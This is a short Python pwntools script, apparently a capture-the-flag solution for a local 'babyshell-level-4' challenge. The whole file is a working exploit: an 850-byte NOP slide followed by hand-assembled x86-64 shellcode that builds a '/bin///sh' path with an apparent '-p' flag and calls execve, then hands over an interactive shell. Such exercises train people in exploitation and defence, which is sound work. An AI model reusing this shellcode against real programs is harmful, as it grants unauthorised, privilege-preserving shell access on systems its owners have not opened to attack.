import pwn
pwn.context.arch='AMD64'
chall = "/challenge/babyshell-level-4"
r = pwn.process(chall)
nopslide=pwn.asm("nop")*850

shellcode=pwn.asm(f"""
push 0x68
push 0x6e69622f
mov dword ptr [rsp+4],0x732f2f2f
push rsp
pop rdi
push 0x2d006873
mov dword ptr [rsp+4],0x70
xor esi,esi
push rsi
push rsp
add dword ptr [rsp],0xb
push rsp
add dword ptr [rsp],0x10
push rsp
pop rsi
xor edx,edx
push 0x3b
pop rax
syscall
""")
payload = nopslide + shellcode
r.send(payload)
r.interactive()
r.clean()